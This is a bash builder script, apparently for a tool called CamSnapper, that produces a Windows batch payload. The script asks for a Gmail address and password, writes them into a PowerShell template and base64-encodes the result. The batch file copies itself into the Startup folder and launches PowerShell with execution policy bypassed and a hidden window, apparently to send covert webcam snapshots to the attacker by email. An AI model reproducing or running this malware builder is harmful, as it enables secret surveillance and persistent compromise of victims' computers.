#!/bin/bash/

trap 'printf "\n";stop;exit 1' 2

command -v pwsh > /dev/null 2>&1 || { printf >&2 "\e[1;93mI require pwsh but it's not installed.Install it.Aborting.\napt install pwsh -y\n\e[0m"; exit 1; }

echo ""
echo ""
clear
printf "\e[1;32m+-----------------------------------\e[0m\e[1;91mRead Me First\e[0m\e[1;32m----------------------------------+\e[0m\n"
printf "\e[1;32m|\e[0m\e[1;36mTurn On \e[0m\e[1;91m_Allow Less Secure Apps_\e[0m\e[1;36m Option In Your Gmail Account Setting.If You Not\e[0m\e[1;32m  |\e[0m\n"
printf "\e[1;32m|\e[0m\e[1;36mTurned On,Then The Photos Will Not Reach To Your Gmail Inbox Due To Google Policy.\e[0m\e[1;32m|\e[0m\n"
printf "\e[1;32m+----------------------------------------------------------------------------------+\e[0m\n"
read -p $'\n\e[1;93mDid you Turn On The _Allow Less Secure Apps_ Option ??? [y/n] :\e[0m' menu


if [[ $menu == y || $menu == Y ]]
then
read -p $'\n\e[1;93mGmail Account : \e[0m' gmail
read -p $'\n\e[1;93mGmail Password : \e[0m' password
read -p $'\n\e[1;93mOutput Name : \e[0m' mail
clear
printf "\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m]\e[0m\e[1;91m Building +_+ \e[0m\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m]\e[0m\n"
sleep 1
cp Cam_Snap.vs Creation.txt
clear
printf "\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m]\e[0m\e[1;91m Building ^_^ \e[0m\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m]\e[0m\n"
sleep 1
clear
sed -i 's/_gmail_/'$gmail'/g' Creation.txt
printf "\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m]\e[0m\e[1;91m Building +_+ \e[0m\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m]\e[0m\n"
sleep 1
clear
sed -i 's/_password_/'$password'/g' Creation.txt
printf "\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m]\e[0m\e[1;91m Building ^_^ \e[0m\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m]\e[0m\n"
sleep 1
clear
echo -e "@echo off" >> $mail.bat 
echo -e "cd %temp%" >> $mail.bat
echo -e '''copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"''' >> $mail.bat
printf "\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m]\e[0m\e[1;91m Building +_+ \e[0m\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m]\e[0m\n"
sleep 1
clear
printf "\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m]\e[0m\e[1;91m Building ^_^ \e[0m\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m]\e[0m\n"
echo -n "powershell -executionpolicy bypass -windowstyle hidden -noexit -nologo  -noprofile -e " >> $mail.bat;pwsh -c "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([IO.File]::ReadAllText('Creation.txt')))" >> $mail.bat
sleep 1
printf "\n\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m]\e[0m\e[1;93m Coverting Powershell File(.ps1) To Batch File(.bat)\e[0m\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m]\e[0m\n"
sleep 1
rm -rf Creation.txt
printf "\n\e[1;93m[\e[0m\e[1;93m+\e[0m\e[1;93m]\e[0m\e[1;36m CamSnapper Is Created SuccessFully.\e[0m\e[1;93m[\e[0m\e[1;93m+\e[0m\e[1;93m]\e[0m\n"
sleep 1
printf "\n\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m]\e[0m\e[1;32m CamSnapper Is Ready To Use \e[0m\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m]\e[0m\n"
sleep 5
bash CamSnap.sh
elif [[ $menu == n || $menu == N  ]]
then
firefox https://myaccount.google.com/lesssecureapps
bash CamSnap.sh
else
	printf "\n"
	printf "\e[1;94m+----------------+ \e[0m\n"
	printf "\e[1;94m| \e[0m\e[1;5;91mInvalid Option\e[0m\e[1;94m | \e[0m\n"
	printf "\e[1;94m+----------------+ \e[0m\n"
	sleep 3
	bash CamSnap.sh
fi